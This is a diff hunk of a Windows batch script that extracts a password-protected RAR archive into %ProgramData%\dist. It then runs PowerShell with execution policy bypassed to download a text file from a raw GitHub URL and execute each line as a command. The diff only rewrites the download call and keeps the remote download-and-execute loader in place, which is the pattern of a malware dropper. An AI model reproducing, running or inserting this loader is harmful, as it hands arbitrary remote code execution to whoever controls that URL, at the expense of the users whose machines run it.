@@ -18,7 +18,7 @@ for %a in (%processList%) do (
 )
 
 "%ProgramData%\dist\UnRAR.exe" x -y -p147852369 "%ProgramData%\dist\51654.rar" "%ProgramData%\dist\"
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$c = (iwr 'https://raw.githubusercontent.com/githa0/0/0/0/confRUSVZ' -UseBasicParsing).Content; foreach ($line in $c -split \"`n\") { cmd /c $line }"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$c = (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/githa0/0/0/0/confRUSVZ' -UseBasicParsing).Content; foreach ($line in $c -split \"`n\") { cmd /c $line }"
 
 setlocal EnableDelayedExpansion
 
